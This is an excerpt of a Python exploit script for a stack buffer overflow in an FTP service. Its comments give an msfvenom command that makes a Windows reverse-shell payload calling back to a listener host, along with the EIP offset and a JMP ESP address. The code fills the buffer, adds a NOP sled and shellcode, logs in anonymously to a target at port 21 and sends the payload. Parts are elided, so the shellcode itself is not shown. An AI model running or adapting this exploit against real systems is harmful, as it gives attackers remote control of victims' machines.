...
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.78 LPORT=4444 -f python -v shellcode -b "\x00"
...
# overwritten EIP - 69413269
# [*] Exact match at offset 247
# JMP ESP from user32.dll - 76F44E5B   FFE4             JMP ESP
#	- To find the .dll, you must mimick the victim's system to find a system .dll 
#	- that JMP ESP that you can abuse, the program does not ship with a .dll to use

payload  = "A" * 247
payload += "\x5B\x4E\xF4\x76" # little endian format
payload += "\x90" * 16
payload += shellcode

try: 
	expl = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	connect = expl.connect(('10.0.0.213',21))
 
	expl.recv(1024)
	expl.send('USER anonymous\r\n')
	expl.recv(1024)
	print("[x] Sending username")
	expl.send('PASS anonymous\r\n')
	expl.recv(1024)
	...
	print("[!] Error sending the exploit")
